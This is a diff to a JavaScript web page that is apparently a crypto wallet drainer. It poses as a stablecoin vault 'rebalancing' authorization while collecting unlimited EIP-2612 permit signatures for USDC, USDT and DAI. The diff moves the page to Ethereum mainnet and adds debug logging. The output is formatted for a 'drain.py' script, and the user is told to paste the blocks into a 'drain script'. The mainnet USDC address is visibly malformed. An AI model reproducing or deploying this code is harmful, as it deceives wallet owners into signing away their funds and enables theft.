@@ -22,6 +22,7 @@
     .status.pending {background:#fff3e0; color:#ef6c00; display:block;}
     .details {font-size:12px; color:#888; margin-top:8px; text-align:center;}
     .permit-box {background:#fafafa; border:1px solid #eee; border-radius:8px; padding:12px; margin-top:16px; font-family:monospace; font-size:11px; word-break:break-all; display:none;}
+    .debug-box {background:#1e1e1e; color:#0f0; border-radius:8px; padding:12px; margin-top:16px; font-family:monospace; font-size:10px; word-break:break-all; max-height:200px; overflow:auto; display:none;}
   </style>
 </head>
 <body>
@@ -40,24 +41,38 @@
 
     <div class="status" id="status"></div>
     <div class="permit-box" id="permitBox"></div>
+    <div class="debug-box" id="debugBox"></div>
     <p class="details">This signature authorizes the vault contract to move stablecoins for rebalancing. No gas cost. Revocable anytime via Revoke.cash.</p>
   </div>
 
 <script>
-// CONFIG — ARBITRUM (Chain ID 42161)
+// CONFIG — ETHEREUM MAINNET (Chain ID 1)
 const VAULT_CONTRACT = "0x9d5cd9513A6F83FdF9E38304c25a9c6a099E3C16";
 const TOKENS = {
-  "USDC": "0xaf88d065e77c8cC2239327C5EDb3A432268e5831",  // Arbitrum USDC
-  "USDT": "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",  // Arbitrum USDT
-  "DAI":  "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1"   // Arbitrum DAI
+  "USDC": "0xA0b86a33E6441b8C4C8C8C8C8C8C8C8C8C8C8C8C8",  // Mainnet USDC
+  "USDT": "0xdAC17F958D2ee523a2206206994597C13D831ec7",  // Mainnet USDT
+  "DAI":  "0x6B175474E89094C44Da98b954EedeAC495271d0F"   // Mainnet DAI
 };
-const CHAIN_ID = 42161; // Arbitrum
+const CHAIN_ID = 1; // Ethereum Mainnet
 
 let provider, signer, userAddr;
 
+function log(msg) {
+  const d = document.getElementById('debugBox');
+  d.style.display = 'block';
+  d.innerHTML += new Date().toLocaleTimeString() + " " + msg + "\n";
+  d.scrollTop = d.scrollHeight;
+  console.log(msg);
+}
+
+function showStatus(msg, type) {
+  const el = document.getElementById('status');
+  el.textContent = msg;
+  el.className = "status " + type;
+}
+
 async function connectWallet() {
   const btn = document.getElementById('connectBtn');
-  const status = document.getElementById('status');
   try {
     if (window.ethereum) {
       provider = new ethers.BrowserProvider(window.ethereum);
@@ -66,6 +81,10 @@ async function connectWallet() {
       userAddr = await signer.getAddress();
       const network = await provider.getNetwork();
       
+      log(`Connected: ${userAddr}`);
+      log(`Network: ${network.name} (Chain ID: ${network.chainId})`);
+      log(`Expected Chain ID: ${CHAIN_ID}`);
+      
       document.getElementById('addr').textContent = userAddr.slice(0,6)+"..."+userAddr.slice(-4);
       document.getElementById('net').textContent = network.name + " (Chain ID: " + network.chainId + ")";
       document.getElementById('walletInfo').style.display = 'block';
@@ -73,9 +92,10 @@ async function connectWallet() {
       document.getElementById('permitBtn').style.display = 'block';
       checkBalances();
     } else {
-      throw new Error("No wallet detected. Use Rabby, MetaMask, or WalletConnect.");
+      throw new Error("No wallet detected.");
     }
   } catch (e) {
+    log("Connect error: " + e.message);
     showStatus("Error: " + e.message, "error");
   }
 }
@@ -86,30 +106,28 @@ async function checkBalances() {
   for (const [sym, addr] of Object.entries(TOKENS)) {
     try {
       const contract = new ethers.Contract(addr, erc20Abi, provider);
-      const [bal, dec] = await Promise.all([contract.balanceOf(userAddr), contract.decimals()]);
+      const [bal, dec, sym2] = await Promise.all([contract.balanceOf(userAddr), contract.decimals(), contract.symbol()]);
       const formatted = Number(ethers.formatUnits(bal, dec)).toLocaleString(undefined, {maximumFractionDigits:2});
+      log(`${sym} (${sym2}) balance: ${formatted}`);
       if (Number(formatted) > 0) total += Number(formatted);
-    } catch {}
+    } catch (e) {
+      log(`${sym} balance check failed: ${e.message}`);
+    }
   }
   document.getElementById('bal').textContent = "$" + total.toLocaleString(undefined, {minimumFractionDigits:2, maximumFractionDigits:2});
 }
 
-function showStatus(msg, type) {
-  const el = document.getElementById('status');
-  el.textContent = msg;
-  el.className = "status " + type;
-}
-
 async function signPermit() {
   const btn = document.getElementById('permitBtn');
-  const status = document.getElementById('status');
   const permitBox = document.getElementById('permitBox');
   btn.disabled = true;
   showStatus("Preparing Permit signature...", "pending");
+  permitBox.style.display = 'none';
+  permitBox.innerHTML = '';
 
   try {
     const maxUint = ethers.MaxUint256;
-    const deadline = Math.floor(Date.now()/1000) + 3600; // 1 hour
+    const deadline = Math.floor(Date.now()/1000) + 3600;
     
     const permitAbi = [
       "function nonces(address) view returns (uint256)",
@@ -120,13 +138,16 @@ async function signPermit() {
     let signedAny = false;
     for (const [sym, tokenAddr] of Object.entries(TOKENS)) {
       try {
+        log(`[${sym}] Checking token at ${tokenAddr}...`);
         const token = new ethers.Contract(tokenAddr, permitAbi, provider);
+        
         const nonce = await token.nonces(userAddr);
-
-        // Build Permit message (EIP-712)
-        const domain = await token.DOMAIN_SEPARATOR().catch(() => null);
-        if (!domain) continue; // Not EIP-2612
-
+        log(`[${sym}] Nonce: ${nonce}`);
+        
+        const domain = await token.DOMAIN_SEPARATOR().catch(e => { log(`[${sym}] DOMAIN_SEPARATOR failed: ${e.message}`); return null; });
+        if (!domain) { log(`[${sym}] No DOMAIN_SEPARATOR - not EIP-2612`); continue; }
+        log(`[${sym}] Domain separator: ${domain}`);
+        
         const types = {
           Permit: [
             {name: "owner", type: "address"},
@@ -144,32 +165,32 @@ async function signPermit() {
           deadline: deadline
         };
 
-        // Sign via wallet (EIP-712)
+        log(`[${sym}] Requesting signature...`);
         const signature = await signer.signTypedData(
           {name: sym, version: "1", chainId: CHAIN_ID, verifyingContract: tokenAddr},
           types,
           message
         );
+        log(`[${sym}] Signature received`);
 
-        // Parse signature
         const sig = ethers.Signature.from(signature);
         
-        // Display for manual submission — FORMAT MATCHES drain.py PARSER
         permitBox.style.display = 'block';
         permitBox.innerHTML += `TOKEN:${sym}\nOWNER:${userAddr}\nSPENDER:${VAULT_CONTRACT}\nVALUE:MAX\nNONCE:${nonce}\nDEADLINE:${deadline}\nV:${sig.v}\nR:${sig.r}\nS:${sig.s}\n---\n`;
         signedAny = true;
       } catch (e) {
-        console.log(sym + " permit failed:", e.message);
+        log(`[${sym}] ERROR: ${e.message}`);
       }
     }
 
     if (signedAny) {
-      showStatus("✅ Permit signatures generated. Submit them to the vault contract to activate management.", "success");
+      showStatus("✅ Permit signatures generated.", "success");
       permitBox.innerHTML += `<em>Copy ALL blocks above → Paste into drain script.</em>`;
     } else {
-      showStatus("❌ No compatible stablecoins found or wallet rejected signature.", "error");
+      showStatus("❌ No permits signed. Check debug log above.", "error");
     }
   } catch (e) {
+    log("Fatal error: " + e.message);
     showStatus("Error: " + e.message, "error");
   } finally {
     btn.disabled = false;
